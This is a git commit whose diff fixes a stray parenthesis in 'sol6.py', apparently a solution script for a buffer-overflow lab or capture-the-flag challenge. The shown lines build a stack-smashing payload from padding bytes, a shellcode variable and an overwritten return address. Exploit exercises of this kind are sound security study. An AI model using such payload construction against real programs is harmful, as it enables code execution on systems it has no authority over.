55d10336d68a0faddcd1857b60d76ae0c70b90da
F Claude <52762083+whoiscoos@users.noreply.github.com>
2021-11-17 23:58:57 -0700

    kill me

--- sol6.py
+++ sol6.py
@@ -6,6 +6,6 @@ from struct import pack
 sys.stdout.buffer.write(b'A' * 422)
 sys.stdout.buffer.write(shellcode)
 
-sys.stdout.buffer.write(b'A' * 591))
+sys.stdout.buffer.write(b'A' * 591)
 sys.stdout.buffer.write(pack("<I", 0xfffee40c))
 
